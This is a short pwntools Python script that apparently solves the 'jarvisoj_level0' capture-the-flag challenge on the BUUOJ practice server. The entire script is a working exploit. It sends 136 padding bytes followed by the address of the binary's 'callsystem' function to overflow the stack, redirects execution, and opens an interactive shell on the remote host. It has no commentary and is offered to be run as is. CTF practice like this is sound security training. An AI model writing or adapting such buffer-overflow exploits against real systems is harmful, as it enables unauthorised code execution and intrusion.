from pwn import *


def jarvisoj_level0(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_level0'):
    print('jarvisoj_level0 start')
    target = remote('node4.buuoj.cn', 25078)
    target_elf = ELF(file_name)

    call_system_ptr = p64(target_elf.symbols['callsystem'])

    payload = b'A' * 136
    payload += call_system_ptr

    target.sendline(payload)

    target.interactive()

    print('jarvisoj_level0 end')


if __name__ == '__main__':
    jarvisoj_level0()
